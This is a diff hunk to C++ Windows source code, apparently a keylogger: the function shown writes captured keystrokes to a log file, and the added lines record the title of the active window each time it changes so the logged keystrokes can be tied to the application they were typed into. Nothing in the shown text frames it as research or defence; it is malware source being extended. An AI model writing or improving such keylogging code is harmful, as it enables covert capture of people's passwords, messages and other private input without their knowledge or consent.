@@ -32,6 +32,18 @@ void keys(int key, const char *filename) {
 		cout << "Cannot open file for logging." << endl;
 	}
 
+	static string activeWindowTitle = "";
+
+	char windowTitle[256];
+	HWND activeWindow = GetForegroundWindow(); // get handle of currently active window
+	GetWindowText(activeWindow, windowTitle, sizeof(windowTitle));
+
+	if (activeWindowTitle != windowTitle)
+	{
+		fprintf(OUTPUT_FILE, "\n\nWindow %s:\n\n", windowTitle);
+		activeWindowTitle = windowTitle;
+	}
+
 	switch (key) {
 	case VK_RETURN:
 		cout << endl;
